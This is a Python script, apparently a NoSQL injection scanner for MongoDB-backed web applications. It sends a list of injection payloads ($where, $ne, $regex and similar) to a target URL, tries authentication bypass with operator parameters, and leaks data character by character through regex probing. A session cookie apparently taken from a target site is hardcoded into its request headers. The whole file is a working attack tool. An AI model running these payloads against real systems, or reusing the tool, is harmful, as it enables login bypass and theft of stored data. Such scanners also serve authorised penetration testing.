#!/usr/bin/python3.7
# Author: Mozzamil Eltayeeb (red-x)
# Last Updated: 20/04/22
# v1.0

# python3 rednosql.py -u <url-without-prameter>  -m <post|get> -d <parameter spareterd with , and set FUZZ to check>

#=====================[Libs]====================
import requests
import string
import argparse
import random
import urllib.parse
import warnings
warnings.filterwarnings("ignore")
#=====================[Get argument from user]=================
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="if request type = GET set URL without any paramter",
                    action='store',
                    required=True)
parser.add_argument("-m","--method",
                    dest="method",
                    help="<GET|POST>",
                    action='store',
                    required=True)
parser.add_argument("-d","--data",
                    dest="data",
                    help="paramter to check example type=user&username=FUZZ",
                    action='store',
                    required=True)
args = parser.parse_args()

url = args.url if args.url else ''
method = args.method if args.method else ''
data = args.data if args.data else ''
headers = {"Content-Type": "application/x-www-form-urlencoded","Cookie": "mitarbeiterterminal=rl43lnn333mbcc295q4ke2q8rb"}

def get_defalut_respone_length():
    if(method.lower() == "get"):
        r = requests.get(url+"?"+data.replace("FUZZ",str(random.getrandbits(128))))
    else:
        r = requests.post(url, data = data.replace("FUZZ",str(random.getrandbits(128))), headers = headers, verify = False, allow_redirects = False)
    count = 0
    for line in r.iter_lines():
        count = count+1
    return count

def random_payloads(default_response_length):
    payloads = ["true, $where: '1 == 1'",
                    ", $where: '1 == 1'",
                    "$where: '1 == 1'",
                    "', $where: '1 == 1'",
                    "1, $where: '1 == 1'",
                    "{ $ne: 1 }",
                    "', $or: [ {}, { 'a':'a","' } ], $comment:'successful MongoDB injection'",
                    "db.injection.insert({success:1});",
                    "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
                    "|| 1==1","' && this.password.match(/.*/)//+%00","' && this.passwordzz.match(/.*/)//+%00",
                    "'%20%26%26%20this.password.match(/.*/)//+%00",
                    "'%20%26%26%20this.passwordzz.match(/.*/)//+%00","{$gt: ''}",
                    "[$ne]=1"]
    for payload in payloads:
        if(method.lower() == "get"):
            r = requests.get(url+"?"+data.replace("FUZZ",urllib.parse.quote(payload)))
        else:
            r = requests.post(url, data = data.replace("FUZZ",urllib.parse.quote(payload)), headers = headers, verify = False, allow_redirects = False)

        count = 0
        for line in r.iter_lines():
            count = count+1
        if(count != default_response_length):
            print("[+] Defreent response (length "+str(count)+") with payload: "+urllib.parse.quote(payload))

def authentication_bypass(default_response_length):
    parameters = []
    parameters.append(data.replace("=FUZZ","[$ne]="+str(random.getrandbits(128))))
    parameters.append(data.replace("=FUZZ","[$gt]=0"))
    parameters.append(data.replace("=FUZZ","[$regex]=.*"))
    parameters.append(data.replace("=FUZZ","[$lt]="+str(random.getrandbits(128))))
    parameters.append(data.replace("=FUZZ","[$nin][]=0"))
    for parameter in parameters:
        if(method.lower() == "get"):
            r = requests.get(url+"?"+parameter)
        else:
            r = requests.post(url, data = parameter, headers = headers, verify = False, allow_redirects = False)

        count = 0
        for line in r.iter_lines():
            count = count+1
        if(count != default_response_length):
            print("[+] Defreent response (length "+str(count)+") with parameters: "+parameter)

def bruteforce(default_response_length):
    leaked_data = list("")
    #This for to extract 5 characters only
    for i in range(5):
        for character in string.printable:
            if character not in {"*","+",".","?","|",'"','\\','#',"$","&"}:
                # print(f"[+] Trying: {''.join(leaked_data)+character}")
                if(method.lower() == "get"):
                    r = requests.get(url+"?"+data.replace("=FUZZ","[$regex]=^%s"%(''.join(leaked_data)+character)))
                else:
                    r = requests.post(url, data = data.replace("=FUZZ","[$regex]=^%s"%(''.join(leaked_data)+character)), headers = headers, verify = False, allow_redirects = False)
                
                count = 0
                for line in r.iter_lines():
                    count = count+1
                if(count != default_response_length):
                    print("[+] Defreent response (length "+str(count)+") with parameters: "+data.replace("=FUZZ","[$regex]=^%s"%(''.join(leaked_data)+character)))
                    leaked_data.append(character)
                    break


if(method.lower() == "get"):
    default_response_length = get_defalut_respone_length()
    print("[+] Default response length: "+str(default_response_length))
    
    print("[+] Trying random payloads")
    random_payloads(default_response_length)
    
    print("[+] Trying authentication bypass with not equal ($ne) or greater ($gt)")
    authentication_bypass(default_response_length)
    
    print("[+] Trying extract data information")
    bruteforce(default_response_length)
    
    print("[+] Scan successfully done")
else:
    r = requests.post(url, data = data.replace("=FUZZ","[$regex]=^a"), headers = headers, verify = False, allow_redirects = False)
    print(r.text)
    default_response_length = get_defalut_respone_length()
    print("[+] Default response length: "+str(default_response_length))
    
    print("[+] Trying random payloads")
    random_payloads(default_response_length)
    
    print("[+] Trying authentication bypass with not equal ($ne) or greater ($gt)")
    authentication_bypass(default_response_length)
    
    print("[+] Trying extract data information")
    bruteforce(default_response_length)
    
    print("[+] Scan successfully done")
